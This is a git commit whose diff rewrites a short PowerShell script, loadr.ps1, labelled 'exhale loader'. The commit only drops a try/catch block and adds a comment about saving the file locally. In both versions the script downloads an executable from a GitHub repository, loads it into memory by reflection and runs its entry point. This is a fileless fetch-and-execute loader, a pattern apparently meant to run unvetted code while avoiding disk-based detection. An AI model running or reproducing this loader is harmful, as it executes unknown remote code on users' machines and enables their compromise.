264ed5a8e595970b6966208f576965620dc4563a
ousdhfoudhoudhgiu <julianelchakieh1@gmail.com>
2026-07-13 03:37:03 -0400

    Refactor loadr.ps1 to remove try-catch block

--- loadr.ps1
+++ loadr.ps1
@@ -1,8 +1,9 @@
-try {
-    Write-Host "`n  exhale loader`n" -ForegroundColor DarkGray
-    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe")
-    $asm = [System.Reflection.Assembly]::Load($bytes)
-    $asm.EntryPoint.Invoke($null, $null)
-} catch {
-    Write-Host "Error: $_" -ForegroundColor Red
-}
+# Save this as loadr.ps1 locally
+Write-Host "`n  exhale loader`n" -ForegroundColor DarkGray
+
+$bytes = (New-Object System.Net.WebClient).DownloadData(
+    "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
+)
+
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, $null)
